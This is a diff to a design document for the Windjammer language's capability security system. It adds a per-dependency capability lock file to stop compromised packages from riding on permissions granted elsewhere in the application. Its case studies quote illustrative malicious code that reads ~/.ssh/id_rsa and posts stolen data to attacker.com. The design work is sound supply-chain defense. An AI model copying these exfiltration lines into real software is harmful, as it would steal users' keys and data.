@@ -94,9 +94,10 @@ npm install colors
 
 1. **Automatic Inference** - The compiler tracks what I/O each function performs
 2. **Application Manifest** - Apps declare allowed capabilities in `wj.toml`
-3. **Compile-Time Enforcement** - Rust backend fails the build if capabilities don't match
-4. **Library Transparency** - Libraries don't need manifests; their capabilities are exported as metadata
-5. **Backend-Appropriate** - Rust gets compile-time safety, other backends get runtime checks
+3. **Per-Dependency Lock File** - Each dependency's capabilities are locked in `.wj-capabilities.lock` (see WJ-SEC-03)
+4. **Compile-Time Enforcement** - Rust backend fails the build if capabilities don't match
+5. **Library Transparency** - Libraries don't need manifests; their capabilities are exported as metadata
+6. **Backend-Appropriate** - Rust gets compile-time safety, other backends get runtime checks
 
 ### Effect Categories
 
@@ -118,7 +119,7 @@ npm install colors
 
 ### 1. Capability Manifest (`wj.toml`)
 
-Applications declare allowed capabilities in their `wj.toml`:
+Applications declare their **own** capabilities (what the application code can do):
 
 ```toml
 [package]
@@ -129,23 +130,26 @@ version = "0.1.0"
 # Tiered security modes
 mode = "restrictive"  # permissive | restrictive | paranoid
 
-# Filesystem access (glob patterns)
-allow_fs_read = ["./config/*", "./data/*.json"]
-allow_fs_write = ["./logs/*", "./tmp/*"]
+# What the APPLICATION CODE can do (not dependencies)
+app_capabilities = [
+    "fs_read:./config/*",
+    "fs_read:./data/*.json",
+    "fs_write:./logs/*",
+    "fs_write:./tmp/*",
+    "net_egress:api.stripe.com",
+    "net_egress:api.github.com",
+    "net_ingress:0.0.0.0:8080",
+    "env:DATABASE_URL",
+    "env:API_KEY",
+]
 
-# Network access (domains/IPs)
-allow_net_egress = ["api.stripe.com", "api.github.com"]
-allow_net_ingress = ["0.0.0.0:8080"]  # Web server
-
-# Environment variables (whitelist)
-allow_env = ["DATABASE_URL", "API_KEY"]
-
-# Process spawning (allowlist commands)
-allow_spawn = []  # No process spawning
-
-# Code execution
-allow_eval = false  # No dynamic code execution
+# Optional: Explicit dependency restrictions (overrides)
+[security.dependencies]
+json-parser = ["logic_only"]  # Force restriction
+http-client = ["net_egress:api.stripe.com"]  # Specific domain
 ```
+
+**Key Change:** Dependencies get their **own** capability allowlists tracked in `.wj-capabilities.lock` (see WJ-SEC-03).
 
 #### Security Modes
 
@@ -246,21 +250,34 @@ pub fn exec(cmd: str, args: List<str>) -> Result<Output, Error> {
    ├─> Function B calls A → B requires <fs_read>
    └─> Transitive closure of effects
 
-2. Check library dependencies
+2. Check library dependencies (per-dependency)
    ├─> Library "json-parser" metadata: requires <logic_only>
    ├─> Library "http-client" metadata: requires <net_egress>
    └─> Library "logger" metadata: requires <fs_write>
 
-3. Validate against manifest
-   ├─> App allows: <fs_read>, <fs_write>, <net_egress>
-   ├─> "json-parser" needs: <logic_only> ✅ ALLOWED (subset)
-   ├─> "http-client" needs: <net_egress> ✅ ALLOWED
-   └─> "logger" needs: <fs_write> ✅ ALLOWED
+3. Load capability lock file (.wj-capabilities.lock)
+   ├─> json-parser: allowed = ["logic_only"]
+   ├─> http-client: allowed = ["net_egress:api.stripe.com"]
+   └─> logger: allowed = ["fs_write:./logs/*"]
 
-4. Build or fail
-   ├─> All capabilities satisfied → Generate binary
-   └─> Unauthorized capability → COMPILE ERROR
+4. Validate PER-DEPENDENCY (CRITICAL!)
+   ├─> json-parser needs: <logic_only>
+   │   └─> Check: <logic_only> ⊆ allowed["json-parser"] ✅ PASS
+   ├─> http-client needs: <net_egress:api.stripe.com>
+   │   └─> Check: verified ⊆ allowed["http-client"] ✅ PASS
+   └─> logger needs: <fs_write:./logs/app.log>
+       └─> Check: verified ⊆ allowed["logger"] ✅ PASS
+
+5. Check application code separately
+   ├─> App code needs: <fs_read:./config/*>, <net_egress:api.stripe.com>
+   └─> Check: verified ⊆ app_capabilities ✅ PASS
+
+6. Build or fail
+   ├─> All per-dependency checks pass → Generate binary
+   └─> ANY violation → COMPILE ERROR with specific dependency named
 ```
+
+**CRITICAL SECURITY NOTE:** Each dependency has its **own** allowlist. If json-parser v1.0 uses `<logic_only>` and v1.1 secretly adds `<net_egress>`, the build fails even if other dependencies use network access.
 
 ---
 
@@ -431,11 +448,28 @@ Error: Capability violation
 
 **Build fails. Attack prevented.**
 
-### Case Study 2: Malicious Dependency
+### Case Study 2: Malicious Dependency (Capability Escalation)
 
 **Scenario:** A developer adds a "colors" library for terminal formatting. The maintainer is compromised and uploads a malicious version.
 
-**Malicious Code:**
+**Initial Installation (v1.0.0 - Benign):**
+```bash
+wj add colors
+```
+
+Compiler analyzes colors v1.0.0:
+```toml
+# .wj-capabilities.lock (auto-generated)
+[dependencies.colors]
+version = "1.0.0"
+declared = ["logic_only"]  # From package metadata
+verified = ["logic_only"]  # Compiler verified actual usage
+allowed = ["logic_only"]   # Auto-set on first build
+```
+
+**Malicious Update (v2.0.0 - Compromised):**
+
+Attacker uploads malicious version:
 ```windjammer
 // colors.wj v2.0.0 (malicious update)
 pub fn red(text: str) -> str {
@@ -448,28 +482,41 @@ pub fn red(text: str) -> str {
 }
 ```
 
-**Application Build:**
+**Developer Updates Dependency:**
 ```bash
-wj build --release
+wj update colors
 ```
 
-**Result:**
+**Compiler Detection:**
 ```
-Error: Dependency capability violation
-  --> colors.wj:3:5
-   |
- 3 |     let ssh_key = fs.read_file("~/.ssh/id_rsa")
-   |                   ^^^^^^^^^^^^ requires <fs_read>
- 4 |     http.post("https://attacker.com/steal", ssh_key)
-   |     ^^^^^^^^^ requires <net_egress>
-   |
-   = note: Dependency 'colors' requires: <fs_read>, <net_egress>
-   = note: Application manifest allows: <logic_only>
-   = help: Review dependency source: Why does a color library need filesystem and network?
-   = help: This is suspicious behavior for a terminal formatting library.
+🚨 SECURITY ALERT: Capability escalation detected
+
+Dependency: colors
+Old version: 1.0.0 (capabilities: logic_only)
+New version: 2.0.0 (capabilities: logic_only, fs_read, net_egress)
+
+CAPABILITY CHANGES:
+  + fs_read:~/.ssh/id_rsa
+  + net_egress:attacker.com
+
+❌ Build failed: colors@2.0.0 requires capabilities NOT in lock file
+   Lock file allows: [logic_only]
+   Package now uses: [logic_only, fs_read, net_egress]
+
+This is SUSPICIOUS for a terminal formatting library.
+
+Actions:
+1. Review changelog: wj changelog colors
+2. Check CVE reports: wj security colors
+3. If legitimate: wj allow colors fs_read net_egress --audit "reason"
+4. If malicious: wj deny colors --report
+
+Build halted. Dependency NOT updated.
 ```
 
 **Build fails. Attack prevented before binary is created.**
+
+**Key Protection:** Even if the application has `fs_read` and `net_egress` in its manifest (for other legitimate purposes), the **per-dependency lock file** prevents colors from using those capabilities.
 
 ### Case Study 3: Safe Library Usage
 
@@ -622,6 +669,102 @@ pub fn upload_logs() {
 
 ---
 
+## Security Vulnerability: Global Manifest Attack
+
+### The Flaw (Original Design)
+
+**Credit:** Identified by Jeffrey Friedman during RFC review (2026-03-21)
+
+**Original flawed design:**
+```toml
+[security]
+# GLOBAL allowlist (applies to ALL dependencies)
+allow_net_egress = ["api.stripe.com"]
+```
+
+**Attack scenario:**
+1. Application legitimately uses `http-client` for Stripe payments
+2. Application manifest allows `<net_egress:api.stripe.com>`
+3. Developer adds `json-parser` dependency (v1.0 is clean)
+4. Attacker compromises json-parser, uploads v1.1 with:
+   ```windjammer
+   http.post("https://attacker.com/exfiltrate", data)
+   ```
+5. Compiler checks: "Does any dependency need net_egress?" YES
+6. Compiler checks: "Does manifest allow net_egress?" YES
+7. **Build succeeds! Attack succeeds!** 🚨
+
+**Root cause:** Global manifest doesn't track **which specific dependency** is allowed to use each capability.
+
+### The Fix (Current Design)
+
+**Per-dependency lock file (`.wj-capabilities.lock`):**
+```toml
+[dependencies.json-parser]
+allowed = ["logic_only"]  # Locked at first build
+
+[dependencies.http-client]
+allowed = ["net_egress:api.stripe.com"]  # Only this dependency can use network
+```
+
+**Same attack scenario:**
+1. Application uses `http-client` (locked to `net_egress:api.stripe.com`)
+2. Application uses `json-parser` (locked to `logic_only`)
+3. Attacker uploads json-parser v1.1 with network code
+4. Compiler detects: json-parser now uses `<net_egress>`
+5. Compiler checks: `<net_egress>` ⊆ allowed["json-parser"]?
+6. `<net_egress>` ⊆ `["logic_only"]`? **NO!**
+7. **Build fails! Attack prevented!** ✅
+
+**Key insight:** The lock file creates **per-dependency capability sandboxes**. Even if the application has network access, json-parser cannot use it unless explicitly granted.
+
+### Enforcement Algorithm
+
+```rust
+fn validate_dependency_capabilities(dep: &Dependency) -> Result<(), Error> {
+    let declared = dep.metadata.capabilities;  // From package
+    let verified = analyze_actual_usage(dep.code);  // Compiler analysis
+    let allowed = lock_file.get_allowed(dep.name);  // From .wj-capabilities.lock
+    
+    // Check 1: Does package lie about capabilities?
+    if !verified.is_subset_of(&declared) {
+        warn!("Dependency {} uses capabilities not declared: {}", 
+              dep.name, verified.difference(&declared));
+    }
+    
+    // Check 2: Does verified usage exceed allowed? (CRITICAL)
+    if !verified.is_subset_of(&allowed) {
+        return Err(Error::CapabilityEscalation {
+            dependency: dep.name,
+            required: verified,
+            allowed: allowed,
+            new_capabilities: verified.difference(&allowed),
+        });
+    }
+    
+    // Check 3: Does allowed exceed app capabilities?
+    if !allowed.is_subset_of(&app_manifest.capabilities) {
+        return Err(Error::ExcessiveGrant {
+            dependency: dep.name,
+            granted: allowed,
+            app_max: app_manifest.capabilities,
+        });
+    }
+    
+    Ok(())
+}
+```
+
+### Why This Matters
+
+**Without per-dependency enforcement:** Malicious packages can piggyback on legitimate permissions.
+
+**With per-dependency enforcement:** Each dependency is sandboxed independently. A compromised package cannot escalate privileges even if other parts of the application use those privileges.
+
+**This fix makes Windjammer's security model sound.** Thank you for identifying this critical issue!
+
+---
+
 ## Open Questions
 
 ### 1. Dynamic Plugin Systems
@@ -745,6 +888,7 @@ only_in = "debug"
 - **Rust Capabilities Research:** "Capabilities for Rust" (ACM PLAS 2021)
 - **Log4Shell Analysis:** CVE-2021-44228 Technical Report
 - **Ambient Authority Problem:** Mark Miller, "Capability Myths Demolished" (2003)
+- **WJ-SEC-03:** [Capability Lock File](./WJ-SEC-03-capability-lock-file.md) - Per-dependency enforcement
 
 ---
 
